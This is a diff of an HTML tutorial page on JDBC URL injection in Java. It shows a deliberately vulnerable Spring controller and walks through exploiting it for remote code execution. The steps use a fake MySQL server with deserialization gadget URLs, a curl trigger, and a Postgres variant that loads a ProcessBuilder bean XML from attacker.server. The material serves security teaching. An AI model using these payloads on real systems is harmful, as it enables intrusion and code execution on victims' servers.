@@ -174,8 +174,7 @@
             <h3 style="text-align: left;">Vulnerable Code Signature:</h3>
             <p style="text-align: left;">The vulnerable code signature more or les looks like below.</p>
             <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #b3ae60;">@RestController<br /></span><span style="color: #cf8e6d;">public class </span>newtest {<br /><br />    <span style="color: #b3ae60;">@GetMapping</span>(<span style="color: #6aab73;">"/jdbcdata"</span>)<br />    <span style="color: #cf8e6d;">public void </span><span style="color: #56a8f5;">test</span>(<span style="color: #b3ae60;">@RequestParam </span>String jstr)<br />    {<br />        <span style="color: #cf8e6d;">try</span>{<br />            String url=jstr;<br />            Connection conn = DriverManager.<span style="font-style: italic;">getConnection</span>(url);<br />        }<span style="color: #cf8e6d;">catch</span>(Exception e)<br />        {<br />            e.printStackTrace();<br />        }<br /><br />    }<br />}</pre></div>
-            <p
-            style="text-align: left;">jstr which has been taken from the user has been assigned to urlpassed to DriverManager.getConnection().</p>
+            <p style="text-align: left;">jstr which has been taken from the user has been assigned to urlpassed to DriverManager.getConnection().</p>
                 <p style="text-align: left;">The final sink function here is the DriverManager.getConnection().</p>
                 <h3>Exploitation:</h3>
                 <p style="text-align: left;">To exploit this flaw we have to set up a fake mysql server which is respond with a Malicious Serialized object which upon getting deserialized will give us code execution.</p>
@@ -191,15 +190,18 @@
                 </div>
                 <div>Run the jar file</div>
                 
-                <div><code><pre>java -jar fake-mysql-cli-0.0.4.jar</pre></code></div>
+                <pre><code>java -jar fake-mysql-cli-0.0.4.jar
+</code></pre>
                 
                 <div>Now the JDBC String you have to send to the vulnerable application looks something like below.</div>
                 
-                <div><code><pre>jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_&ltgadget_name>_&ltbinary_name></binary_name></pre></code></div>
+                <pre><code>jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_&ltgadget_name>_&ltbinary_name>
+</code></pre>
                 
                 <div>For example if you want to use commonBeanUtils gadget with binary to be notepad.exe then the JDBC string looks like below.</div>
                 
-                <div><code><pre>jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CB_notepad.exe</pre></code></div>
+                <pre><code>jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CB_notepad.exe
+</code></pre>
                 
                 <div>
                     <br />
@@ -215,7 +217,8 @@
                 <div>Start the fake mysql server.</div>
                 <div>
                     
-                    <div><code><pre>java -jar fake-mysql-cli-0.0.4.jar</pre></code></div>
+                    <pre><code>java -jar fake-mysql-cli-0.0.4.jar
+</code></pre>
                     
                     <div><img src="images/jdbcinjection/fakemysqlserver.png"></div>
                     <div>
@@ -223,7 +226,8 @@
                     </div>
                     <div>Fire the below curl command</div>
                     
-                    <div><code><pre>curl http://localhost:8080//jdbcdata?jstr=jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CC31_calc.exe</pre></code></div>
+                    <pre><code>curl http://localhost:8080//jdbcdata?jstr=jdbc:mysql://68.183.70.210:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=deser_CC31_calc.exe
+</code></pre>
                     <div><video width="900" controls><source src="videos/mysqlexploit.mp4" type="video/mp4"></video></div>
                     <div>you can see the calc.exe got popped up.</div>
                 </div>
@@ -235,25 +239,21 @@
                     <p>Instead of Mysql if the Application uses Postgres Connector then we can exploit it using the followsing steps</p>
                     <ul>
                         <li>Host a bean xml file with the following contents</li>
-                        <code>
-                            <pre>
-                                <code><pre>
-&ltbeans xmlns="http://www.springframework.org/schema/beans"
-xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-&ltbean id="pb" class="java.lang.ProcessBuilder">
-&ltconstructor-arg>
-&ltlist>
-&ltvalue>calc.exe&lt/value>
-&lt/list>
-&lt/constructor-arg>
-&ltproperty name="whatever" value="#{ pb.start() }" />
-&lt/bean>
-&lt/beans>
-                                    </pre></code>
-                            </pre>
-                        </code>
+<pre><code>&lt;beans xmlns="http://www.springframework.org/schema/beans"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
+&lt;bean id="pb" class="java.lang.ProcessBuilder"&gt;
+&lt;constructor-arg&gt;
+&lt;list&gt;
+&lt;value&gt;calc.exe&lt;/value&gt;
+&lt;/list&gt;
+&lt;/constructor-arg&gt;
+&lt;property name="whatever" value="#{ pb.start() }" /&gt;
+&lt;/bean&gt;
+&lt;/beans&gt;
+</code></pre>
                         <li>Pass the below JDBC Url to the target application</li>
-                        <code><pre>jdbc:postgresql://canbeanything/saas?&socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://attacker.server:9001/test.xml</pre></code>
+<pre><code>jdbc:postgresql://canbeanything/saas?&socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://attacker.server:9001/test.xml
+</code></pre>
                     </ul>
                     <div>
                     </div>
